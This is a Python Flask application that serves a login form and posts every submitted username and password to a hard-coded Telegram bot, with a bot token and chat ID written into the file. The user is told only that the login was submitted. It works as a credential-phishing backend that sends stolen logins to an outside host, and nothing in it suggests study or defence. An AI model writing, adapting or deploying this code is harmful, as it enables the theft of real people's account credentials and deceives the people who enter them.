from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# === Telegram Bot Configuration ===
BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"  # your bot token
CHAT_ID = "6291023089"  # your chat id

# Function to send message to Telegram
def send_to_telegram(username, password):
    message = f"🔐 New Login Attempt\n👤 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error sending message:", e)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Send to Telegram
        send_to_telegram(username, password)

        return render_template('index.html', message="Login submitted successfully!")
    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True)
